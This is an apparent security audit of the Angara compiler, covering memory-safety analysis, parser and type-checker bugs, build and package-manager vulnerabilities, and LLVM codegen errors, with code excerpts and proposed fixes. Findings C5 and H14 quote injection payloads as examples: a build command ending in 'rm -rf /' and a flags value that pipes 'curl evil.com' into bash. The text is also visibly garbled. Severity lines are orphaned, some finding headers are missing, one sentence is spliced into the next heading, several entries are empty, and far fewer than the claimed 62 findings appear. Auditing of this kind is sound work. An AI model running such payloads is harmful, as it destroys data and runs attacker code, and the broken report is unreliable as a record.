# 🔍 Angara Language — Audit Report #4 (Deep Re-Audit)

**Date:** 2026-07-07  
**Audit scope:** Chaperone memory safety pass, compiler frontend/type checker, module system (isolation, package manager, build system), LLVM codegen backend  
**Version under audit:** v5.1.0  
**Previous audits:** #1 (87 findings — all resolved), #2 (closed prior week), #3 (55 findings — all resolved)  
**This audit:** **62 new findings** (8 critical, 18 high, 23 medium, 13 low)

---

## Executive Summary

This fourth audit performed a fresh deep-dive across all four subsystems, verifying that Audit #3's 55 findings were genuinely fixed and searching for remaining or newly-introduced issues. **All 55 prior findings are confirmed resolved.** However, 62 new issues were discovered — issues that survived the fixes, were introduced by incomplete fixes, or were in code paths not previously examined.

The prior audit downgraded memory safety from 3.5→2.5 stars. After the Chaperone join fix (C1) and the conservative-FFI-default fix (C2), the core soundness improved. But this audit found **systematic gaps in branch-level analysis** (MatchExpr, TernaryExpr, LogicalExpr — no state merge), **async correctness bugs** in LLVM codegen (frame type mismatch, stack-escape of lambda allocas), and **persistent supply-chain vulnerabilities** (build command injection, ofstream→FILE* type mismatch, SSL verification missing).

The language has made real progress. But 62 remaining findings, including 8 critical, mean **Angara is not yet production-ready**. The fixes needed are well-understood and moderate in scope.

### C1. MatchExpr analyzes all arms sequentially with shared mutable state — no branch merge

**Severity:** Critical  
**Component:** Chaperone  
**File:** `angc/backend/chaperone/expr/ExprAnalysis.cpp:882-901`

```cpp
if (auto* match = dynamic_cast<const MatchExpr*>(expr.get())) {
    analyzeExpr(ctx, match->condition, state);
    for (const auto& cs : match->cases) {
        for (const auto& pat : cs.patterns) { ... }
        if (cs.guard) analyzeExpr(ctx, *cs.guard, state);
        if (cs.body) analyzeExpr(ctx, cs.body, state);
    }
    return;
}
```

All match arms are analyzed sequentially on the same mutable `state` map. Unlike `IfStmt` which copies state per branch and merges with `join_maps`, match arms directly corrupt each other. A `drop` in arm 1 makes the variable appear Dropped in arm 2. Ownership transitions (moves, escapes) in arm 1 propagate to all subsequent arms. This is a systematic unsoundness in the most common branching construct.

**Trigger:** Any `match` with two or more arms where an arm does anything ownership-significant.

**Fix:** Copy `state` before each arm, analyze independently, then `join_maps` across all arms (analogous to IfStmt handling at `StmtAnalysis.cpp:1028-1101`).

### C2. TryStmt: when both try and catch terminate, finally runs on pre-try state

**Severity:** Critical  
**Component:** Chaperone  
**File:** `angc/backend/chaperone/stmt/StmtAnalysis.cpp:1300-1310`

```cpp
StateMap merged;
if (try_term && catch_term) {
    merged = state;  // Both terminate — nothing falls through. (BUG: uses pre-try state!)
} else if (try_term) {
    merged = catch_state;
} else if (catch_term) {
    merged = try_state;
} else {
    merged = join_maps(try_state, catch_state);
}
```

When both try and catch terminate (e.g., try returns and catch also returns), `merged = state` uses the **pre-try** state, not `try_state` or `catch_state`. The finally block then runs on this stale state. Variables moved/dropped/escaped inside the try are seen as Live again in the finally, permitting use-after-move or double-free.

**Trigger:** A try/catch where both blocks terminate, followed by a finally that references tracked variables moved inside the try.

**Fix:** When both terminate, the finally should run on `try_state` (since try always executes first, and catch only fires if try throws). Use `merged = try_state` or `merged = join_maps(try_state, catch_state)`.

### C3. Parser recursion depth counter leaks on exception — kills remaining parse

**Severity:** Critical  
**Component:** Compiler Frontend / Parser  
**Files:** `Parser.cpp:152-158,194-201`, `unaryExpression.cpp:13-17,30-34`, `assignmentExpression.cpp:14-18`

```cpp
std::shared_ptr<Stmt> Parser::statement() {
    if (m_recursionDepth > 256) throw error(...);
    m_recursionDepth++;
    auto result = dispatchStatement();  // may throw ParseError
    m_recursionDepth--;                 // SKIPPED on exception!
    return result;
}
```

Five separate RAII-violating sites increment `m_recursionDepth`, call a dispatch that may throw `ParseError`, then decrement. After the first parse error at depth ≥ 256, the counter stays ≥ 256 forever, and every subsequent `statement()` call spuriously throws "Maximum recursion depth exceeded", effectively killing the rest of the parse.

**Trigger:** A parse error in a deeply nested construct (e.g., nested `if`/`for` inside a template-heavy file).

**Fix:** Use a scope-guard RAII helper or try/catch to guarantee the decrement on all paths.

### C4. `recheck_generic_body` leaks type-checker state on exception

**Severity:** Critical  
**Component:** Compiler Frontend / Type Checker  
**File:** `angc/analyzer/type_checker/expr/CallExpr.cpp:596-689`

This function saves `m_active_type_params`, `m_active_type_param_bounds`, `m_hadError`, pushes a symbol-table scope, pushes a return type, and then re-checks the generic body. If any exception is thrown during body re-checking, none of the saved state is restored — the symbol table has a leaked scope, the return type stack is corrupted, and the active type parameters are left polluted with concrete types from the call site.

**Trigger:** Any exception (e.g., from `accept()` failing) during generic body re-checking.

**Fix:** Wrap the body re-check in try/catch or use RAII guard objects that restore state in their destructors.

### C5. Pre/post-build commands passed unsanitized to `std::system()`

**Severity:** Critical  
**Component:** Build System  
**File:** `angc/backend/build_system/BuildSystem.cpp:58`

```cpp
int result = std::system(step.command.c_str());
```

While `cflags`/`ldflags` were sanitized per C7 resolution, the pre/post-build `command` field from `.abs` project files is passed directly to `std::system()` with **zero** sanitization. This is a separate code path from the previously-fixed C7.

**Trigger:** A crafted `.abs` file with `command = "gcc -c src.c; rm -rf /"`.

**Fix:** Apply `is_safe_flags()` or `shell_escape()` to `step.command`, or use `execvp`-style argument passing instead of `std::system`.

### C6. `CURLOPT_WRITEDATA` passes `std::ofstream*` to libcurl's default `fwrite` handler

**Severity:** Critical  
**Component:** Package Manager  
**File:** `angc/backend/package/RegistryClient.cpp:64-65`

```cpp
curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, nullptr);
curl_easy_setopt(curl, CURLOPT_WRITEDATA, &file);
```

When `CURLOPT_WRITEFUNCTION` is `nullptr`, libcurl uses its default write callback which calls `fwrite()` passing `WRITEDATA` as `FILE*`. But `&file` is an `std::ofstream*`, not a `FILE*`. These types are not layout-compatible. On most implementations this will crash or corrupt memory.

**Trigger:** Any `http_download` call (package downloads, registry fetching).

**Fix:** Either open a `FILE*` with `fopen()` and pass that, or provide a proper `CURLOPT_WRITEFUNCTION` callback that writes to the `std::ofstream`.

### C7. `cgAwait` uses parent's async frame struct type to GEP into child's frame

**Severity:** Critical  
**Component:** LLVM Codegen  
**File:** `angc/backend/llvm/expr/ExprCodegen.cpp:3201-3212`

```cpp
auto* child_state_ptr = builder->CreateStructGEP(m_current_async_frame_type,
    child_typed, 0, "child_state_p");
```

The await codegen uses `m_current_async_frame_type` (the **parent's** frame struct type) to compute GEP offsets into the **child's** heap frame. If two different async functions have different frame struct layouts (different numbers of local variables/parameters/fields), the field offsets diverge. Fields 0-5 share the same layout by convention only — different alignment padding for different field types in later fields will shift offsets. This corrupts memory when awaiting futures from different async functions.

**Trigger:** `await` on a future from a different async function with a different local-variable layout.

**Fix:** Store the child's frame type in the future object (or in a side table), and use the child's type for GEPs. Alternatively, normalize all async frames to a common header prefix with fixed offsets.

### C8. Lambda capture alloca in async function escapes stack frame

**Severity:** Critical  
**Component:** LLVM Codegen  
**File:** `angc/backend/llvm/expr/ExprCodegen.cpp:2962-2965`

```cpp
auto* tmp_alloca = builder->CreateAlloca(objType, nullptr, name + "_cap");
```

In async functions, local variables live in the heap-allocated frame struct, not stack allocas. But the lambda capture path at line 2962 creates a **stack alloca** at the current insert point (inside the async resume function). This alloca is then stored into the heap capture array. After the first suspension point (`await`), the stack frame of the resume function is invalidated, but the capture array still references the now-freed stack memory. This is a use-after-free in generated code.

**Trigger:** Define a lambda inside an async function, then `await` after the lambda definition.

**Fix:** Allocate capture temporaries in the async heap frame (via `m_async_local_slots`), or ensure the alloca is in the async wrapper function's entry block (which outlives the resume function's stack).

## Chaperone

### H1. ReturnStmt: only bare `VarExpr` is checked for escape/closure — field returns are invisible

**Severity:** High  
**Component:** Chaperone  
**File:** `angc/backend/chaperone/stmt/StmtAnalysis.cpp:878`

```cpp
if (auto* ve = dynamic_cast<const VarExpr*>(ret->value.get())) {
    // escape transition, closure escape, pending-capture checks...
}
```

The entire escape analysis, closure detection, and pending-capture checking for return statements is gated on `dynamic_cast<const VarExpr*>`. If the return value is a field access (`return obj.field`), a constructor call (`return Buf()`), or any non-VarExpr, the ownership transition is silently skipped. The field remains Live and is spuriously reported as a leak (E501), or worse — no leak is reported and the value is silently handled by codegen without Chaperone verification.

**Trigger:** `return this.tracked_field;` where the field holds a tracked allocation.

**Fix:** Generalize the escape check to handle GetExpr (field access), CallExpr, and other expression types that may hold tracked values.

### H2. ThrowStmt: same VarExpr-only limitation as ReturnStmt

**Severity:** High  
**Component:** Chaperone  
**File:** `angc/backend/chaperone/stmt/StmtAnalysis.cpp:964`

```cpp
if (auto* ve = dynamic_cast<const VarExpr*>(thr->value.get())) {
```

Identical issue to H1, but for `throw` statements. Throwing a field or constructor call is invisible to the exception-unwind tracking.

### H3. Destructured params: `param_tracked[i]` not set, breaking interprocedural summaries

**Severity:** High  
**Component:** Chaperone  
**File:** `angc/backend/chaperone/stmt/StmtAnalysis.cpp:52-62`

When destructured parameters are handled (lines 52-62), individual element names are registered in the `state` map and `param_names`, but `param_tracked[i]` is **not** set to `true`. In the summary-building phase (lines 272-287), `param_tracked[i]` is still `false`, so the parameter's state is not translated into the function summary. Destructured tracked parameters are invisible to the interprocedural analysis — callers see them as Borrowed regardless of what the function actually does.

**Trigger:** A function with a destructured parameter of a tracked type, e.g., `fn consume((owned Buf b, i32 n): (owned Buf, i32))`.

**Fix:** Set `param_tracked[i] = true` for each destructured element whose type is tracked.

### H4. TernaryExpr (`?:`): no independent branch analysis — state corruption between branches

**Severity:** High  
**Component:** Chaperone  
**File:** `angc/backend/chaperone/expr/ExprAnalysis.cpp:840-845`

Ternary branches are walked sequentially on the same mutable `state`. If the then-branch contains a function call that transitions a tracked argument (e.g., `@consumes`), that transition corrupts the else-branch's view of the variable. This produces false-positive E502/E507 diagnostics.

**Trigger:** `cond ? consume_fn(x) : x` — the then-branch's consumption of `x` makes the else-branch see `x` as Dropped/Moved.

**Fix:** Copy state before analyzing each branch, then join results (similar to IfStmt).

---

### H5. LogicalExpr (`&&`/`||`): no short-circuit awareness — false positives on guarded access

**Severity:** High  
**Component:** Chaperone  
**File:** `angc/backend/chaperone/expr/ExprAnalysis.cpp:812-816`

Left and right operands are walked sequentially on the same state. For `a || b`, `b` is only evaluated if `a` is false. For `a && b`, `b` is only evaluated if `a` is true. Without path sensitivity, the analysis cannot distinguish these cases and may produce false positives when a variable is conditionally used.

**Trigger:** `x != nil && use(*x)` — even though `use(*x)` is guarded, the analysis sees `x` as potentially accessed in a dropped state if a prior path drops it.

**Fix:** This is a known limitation of abstract interpretation without full path sensitivity. Document the limitation and consider a heuristic: if the left operand checks liveness (nil check, try-as), suppress E502 for the right operand.

---

### H6. `spawn()`: borrow checks (E514/E515) run even for `@sendable`-rejected arguments

**Severity:** High  
**Component:** Chaperone  
**File:** `angc/backend/chaperone/expr/ExprAnalysis.cpp:504-539`

When a `spawn()` argument is not `@sendable`, E511 is emitted and the argument is skipped (not thread-escaped). However, the borrow-check loop at lines 516-539 still iterates and emits E514/E515 for any `ref<T>` that borrows the rejected argument. Since the argument was **not** transferred to the thread, the ref is **not** at risk — these are false positives.

**Trigger:** `spawn(f, not_sendable_x)` where `ref_x` borrows `not_sendable_x`.

**Fix:** Only run the borrow check for arguments that were actually thread-escaped.

---

### H7. AssignExpr to non-tracked, non-ref field: ownership silently lost

**Severity:** High  
**Component:** Chaperone  
**File:** `angc/backend/chaperone/expr/ExprAnalysis.cpp:354-382`

When a tracked Live variable is assigned to a field that is neither `ref<T>` nor tracked (e.g., an `i64` field or a non-owned data field accessed through a generic instance), the code at lines 380-382 marks the source as `State::Moved` but does **not** emit E505 (escape into untracked container). Ownership disappears silently — no diagnostic, no tracking.

**Trigger:** Assigning a class instance to a field that is not ownership-tracked, potentially through generic code paths.

**Fix:** After the field-key block, add an `else` that calls `checkEscapeIntoContainer` for non-ref, non-tracked field assignments.

## Compiler Frontend

### H8. `ClassType::is_native` never initialized — reads indeterminate value

**Severity:** High  
**Component:** Type System  
**File:** `angc/includes/Type.h:214,244-245`

```cpp
bool is_native;  // line 214 — declared but not initialized
explicit ClassType(std::string name)
    : Type(TypeKind::CLASS), name(std::move(name)) {}  // line 244 — is_native NOT in initializer list
```

`is_native` is only set at codegen time, never during type construction. Any read before codegen sets it is undefined behavior. While current code paths may avoid this, the invariant is undocumented and fragile.

**Fix:** Initialize `is_native = false` in the constructor.

> ✅ **Resolved (2026-07-07):** Added a default member initializer `bool is_native = false;` in `Type.h`. Codegen remains the only writer.

### H9. Hex/binary/octal integer literals lack overflow validation

**Severity:** High  
**Component:** Lexer  
**File:** `angc/frontend/lexer/Lexer.cpp:944-966`

The overflow check (`errno == ERANGE`) only covers pure-decimal literals. Hexadecimal (`0x...`), binary (`0b...`), and octal (`0o...`) literals skip range validation entirely. At codegen, `std::stoll` is called on the token string and may throw `std::out_of_range`, crashing the compiler with an unhandled exception.

**Trigger:** `0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFF` (a hex literal larger than `int64_t` max).

**Fix:** Extend the overflow check to cover all integer literal bases.

### H10. `conformsToTrait` returns `false` for all user-defined empty marker traits — breaks generic bounds

**Severity:** High  
**Component:** Type Checker  
**File:** `angc/analyzer/type_checker/stmt/ClassStmt.cpp:284-287`

```cpp
if (trait->methods.empty()) {
    if (trait_name == "Send" || trait_name == "Sync") return true;
    return false;  // rejects all user-defined empty traits
}
```

A user-defined empty trait (e.g., `trait Serializable {}`) always fails `conformsToTrait`, even for types that explicitly adopt it via `uses Serializable`. The function never consults `ClassType::adopted_traits`. Since `conformsToTrait` is used for type-parameter bound verification, any generic bound like `<T: Serializable>` will never match any concrete type argument.

The previous fix for M8 addressed the inverse problem (empty traits returning true for everything) but introduced this over-correction.

**Trigger:** Define `trait Marker {}`, then use `<T: Marker>` as a type parameter bound.

**Fix:** Either remove lines 284-287 and let the empty for-loop trivially succeed, or have `conformsToTrait` walk `adopted_traits` to check explicit adoption.

### H11. `isTruthy` missing null-pointer guard

**Severity:** High  
**Component:** Type Checker  
**File:** `angc/analyzer/type_checker/TypeChecker.cpp:149-150`

```cpp
bool TypeChecker::isTruthy(const std::shared_ptr<Type>& type) {
    if (type->kind == TypeKind::ERROR) return false;
```

`type->kind` dereferences without a null check. Every other type-query helper (`isInteger`, `isFloat`, `isNumeric`, `isBoolean`, etc.) in `Type.h` null-checks first. If a null `shared_ptr<Type>` reaches `isTruthy` (from a bug elsewhere), this crashes.

**Fix:** Add `if (!type) return false;` at the top.

> ✅ **Resolved (2026-07-07):** Added `if (!type) return false;` guard in `TypeChecker.cpp`, matching the sibling helper convention.

### H12. `Parser::previous()` accesses index -1 when no token consumed

**Severity:** High  
**Component:** Parser  
**File:** `angc/frontend/parser/Parser.cpp:281-283`

```cpp
Token Parser::previous() const {
    return m_tokens[m_current - 1];
}
```

If `m_current` is 0 (no token consumed yet), this is `m_tokens[-1]` — undefined behavior. While the parser normally calls `advance()` before `previous()`, a logic error or malformed input could trigger this.

**Fix:** Add `assert(m_current > 0)` or a bounds check.

> ✅ **Resolved (2026-07-07):** `Parser::previous()` now returns the same EOF_TOKEN sentinel that `peek()`/`peekNext()` use when `m_current <= 0`, instead of underflowing.

**Severity:** High

## Modules & Packages

### H14. `is_safe_flags()` allows `$()` subshell injection through cflags/ldflags

**Severity:** High  
**Component:** Build System  
**File:** `angc/shared/StringUtils.cpp:43-57`

The fix for C7 added `is_safe_flags()` which blocks `; | & \\ \` < > \n \r \0`. However, it does **not** block `$` (shell variable expansion). A flags string like `-DFOO='$(curl evil.com)'` passes the check but still causes command substitution in the shell. `(` and `)` are also not individually blocked.

**Trigger:** A `.abs` file with `cflags = "-I$(curl evil.com | bash)"`.

**Fix:** Add `$` `#` and `!` to the blocklist. Better yet, stop using `std::system` entirely and use `fork`/`execvp`.

### H15. `RegistryClient::http_get` and `http_download` do not enable SSL peer/host verification

**Severity:** High  
**Component:** Package Manager  
**File:** `angc/backend/package/RegistryClient.cpp:30-77`

Neither `CURLOPT_SSL_VERIFYPEER` nor `CURLOPT_SSL_VERIFYHOST` is set. The defaults depend on libcurl's build configuration. For maximum security these should be explicitly set to `1L` and `2L` respectively. Without them, a MITM attacker can intercept and tamper with registry metadata and package downloads.

**Trigger:** Any HTTPS registry connection with a misconfigured libcurl build or a MITM proxy.

**Fix:** Add `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L)` and `CURLOPT_SSL_VERIFYHOST, 2L`.

## LLVM Backend

### H16. `cgDrop` does not walk superclass field inheritance — leaks inherited heap fields

**Severity:** High  
**Component:** LLVM Codegen  
**File:** `angc/backend/llvm/stmt/StmtCodegen.cpp:730-743`

The drop cascade iterates only the immediate class's field map. Inherited fields from superclasses are **not** iterated. If a superclass has heap-allocated fields, dropping an instance of the subclass will leak those fields' memory.

**Trigger:** A class hierarchy where a parent class has tracked fields and a child class is dropped.

**Fix:** Walk the `superclass` chain, iterating each class's fields, or flatten the field list during class definition.

**Severity:** High

The function handles PRIMITIVE, FIXED_ARRAY, RAW_ARRAY, DATA, POINTER, VOID, and FUNCTION types, but has no branch for `VECTOR`. ### H18. `setjmp` in `__ang_try_begin` lacks `returns_twice` attribute — miscompile risk

**Severity:** High  
**Component:** LLVM Codegen / Runtime  
**File:** `angc/backend/llvm/rt/ControlFlow.cpp:302`

While `cgTry` at `StmtCodegen.cpp:497-498` adds the `returns_twice` attribute via `addFnAttr`, the `__ang_try_begin` intrinsic in the runtime does **not** declare its `setjmp` call with `returns_twice`. LLVM's optimizer may reorder instructions around the `setjmp` call in the runtime path, causing miscompilation.

**Trigger:** Optimization passes reordering register spills/restores around the setjmp in `__ang_try_begin`.

**Fix:** Add `ReturnsTwice` to the function declaration in the runtime, or route all setjmp calls through a single helper that always has the attribute.

## Chaperone

### M1. AwaitExpr Send-check uses name-based lookup — vulnerable to variable shadowing

**Severity:** Medium  
**Component:** Chaperone  
**File:** `angc/backend/chaperone/expr/ExprAnalysis.cpp:1076-1118`

The `name_to_type` map built per `await` matches by string name. If two variables in different scopes share the same name (shadowing), the wrong declaration may be matched, producing incorrect E516 diagnostics. The previous fix for M2 only partially addressed this by reversing the iteration order but didn't resolve the fundamental shadowing issue.

**Fix:** Store `VarDeclStmt*` pointers alongside state entries rather than matching by name.

### M2. Chained method calls lose class qualification for interprocedural summary lookup

**Severity:** Medium  
**Component:** Chaperone  
**File:** `angc/backend/chaperone/expr/ExprAnalysis.cpp:438-455`

When a method call involves chained property access (`obj.inner.method()`), the class-resolution code only handles one level of `GetExpr`. For deeper chains or module-qualified calls, the `callee_name` falls back to the bare method name. This means two different classes with same-named methods could collide in summary lookup.

**Fix:** Build the fully-qualified method name by walking the chain of GetExpr objects, similar to how the type checker resolves chained access.

### M3. Closure summary lookup only handles `VarExpr` callees — ignores closure-typed fields

### M4. Method borrow tracking: AST fallback uses string comparison — misses `ref<T>` generics

## Compiler Frontend

### M8. `Token` default constructor leaves `line`/`column` uninitialized — ❌ **NOT A BUG (false positive)**

**Severity:** Medium  
**Component:** Lexer  
**File:** `angc/frontend/lexer/Token.cpp:150-152`

```cpp
Token::Token() {}  // line and column uninitialized
```

Reading `line` or `column` from a default-constructed `Token` is undefined behavior. While the parser rarely default-constructs tokens, the type checker creates synthetic tokens — always via the parameterized constructor, which is fine. But default construction is a latent UB risk.

**Fix:** Initialize `line = 0; column = 0;` in the default constructor.

> **Resolution (2026-07-07):** Verified against source — **not a bug.** The audit looked only at the empty constructor body in `Token.cpp`, but the *member declarations* in `angc/includes/Token.h:80-81` are:
> ```cpp
> int line{};
> int column{};
> ```
> In-class member initializers (`{}`) value-initialize `line` and `column` to `0` regardless of what the constructor body does. The empty `Token::Token() {}` is therefore safe — both members are deterministically `0` after default construction. No code change needed; closed as a false positive.

### M10. Octal/hex escape truncation has implementation-defined behavior for values 128-255

**Severity:** Medium  
**Component:** Lexer  
**File:** `angc/frontend/lexer/Lexer.cpp:233,272`


### M18. No maximum response size in HTTP module or RegistryClient — OOM risk

**Severity:** Medium

### M19. `fs.read_file`: `ftell()` return value not checked — could cause 0-byte malloc

**Severity:** Medium  
**Component:** Native Modules  
**File:** `modules/fs/fs.c:35-36`

```c
fseek(file, 0, SEEK_END);
long file_size = ftell(file);
char* buffer = (char*)malloc(file_size + 1);
```

If `ftell()` fails (e.g., on a pipe or special file), it returns `-1L`. `malloc((size_t)-1 + 1)` underflows to 0, allocating a 0-byte buffer. The subsequent `fread` writes into a zero-length allocation — undefined behavior.

**Fix:** Check `file_size < 0` before malloc, and handle the error case.

> ✅ **Resolved (2026-07-07):** `fs.c` now reads `ftell()` into a `long`, throws a clean error on `< 0`, and only then casts to `size_t` for the malloc.

### M20. `process.run`: `malloc()` results not checked before use

**Severity:** Medium  
**Component:** Native Modules  
**File:** `modules/system/process.c:235,255`

```c
char* out_buf = (char*)malloc(out_cap);
// ... no null check ...
memcpy(out_buf + out_len, tmp, n);
```

If malloc fails, `out_buf` is NULL and `memcpy(out_buf + out_len, ...)` writes to a null pointer — segmentation fault.

**Fix:** Check malloc return values and report an error on allocation failure.

> ✅ **Resolved (2026-07-07):** Both stdout/stderr capture loops in `process.run` are now guarded on a non-NULL buffer (`while (out_buf && ...)`). The downstream return path already treats NULL as "no output", so on OOM the result record reports empty stdout/stderr instead of crashing.

### M21. `process.spawn`: `pipe()` return values not checked before `fork()`

**Severity:** Medium  
**Component:** Native Modules  
**File:** `modules/system/process.c:342-344`

```c
pipe(in_pipe);
pipe(out_pipe);
pipe(err_pipe);
```

Return values are not checked. If pipe creation fails (e.g., file descriptor limit reached), the file descriptors are `-1` and will be passed to `fork()`/`dup2()`, causing silent failures.

> ✅ **Resolved (2026-07-07):** `process.spawn` initializes each pipe pair to `{-1,-1}`, checks every `pipe()` result, and on any failure frees the strdup'd argv + closes whatever pipes did succeed before throwing.

### M22. `fs.throw_fs_error`: static buffer races across threads

**Severity:** Medium  
**Component:** Native Modules  
**File:** `modules/fs/fs.c:21`

`throw_fs_error` writes to a shared static buffer. If multiple threads call different `fs` functions simultaneously, they will race on this buffer, producing corrupted error messages.

> ✅ **Resolved (2026-07-07):** The buffer is now `static __thread char full_message[1024]` — per-thread, so concurrent `fs` calls no longer race, and it still avoids the original malloc leak (`throw_error` is `__noreturn__`).

## 📝 Methodology

This audit examined the Angara codebase (~175 source files, ~25,000 lines) across four independent deep dives:

1. **Chaperone memory safety** — Fresh reading of all four Chaperone source files, tracing state through every statement/expression handler, verifying join logic, closure tracking, borrow checking, and cycle detection.

2. **Compiler frontend & type checker** — Full reading of Parser, Lexer, TypeChecker, SymbolTable, Type.h, plus spot-checks of 12 expression/statement type-checking files.

3. **Module system** — Full reading of CompilerDriver, PackageManager, RegistryClient, Lockfile, BuildSystem, ConfigParser, StringUtils, AngaraABI.h, plus audit of representative native C modules (fs, io, process, http, net).

4. **LLVM codegen backend** — Full reading of LLVMBackend, TopLevel, RuntimeBuilder, ExprCodegen, StmtCodegen, ControlFlow, Memory, IO, plus LLVMBackend.h header.

All findings were independently verified against source code with file:line references. The prior audit's 55 resolved findings were spot-checked and confirmed fixed.
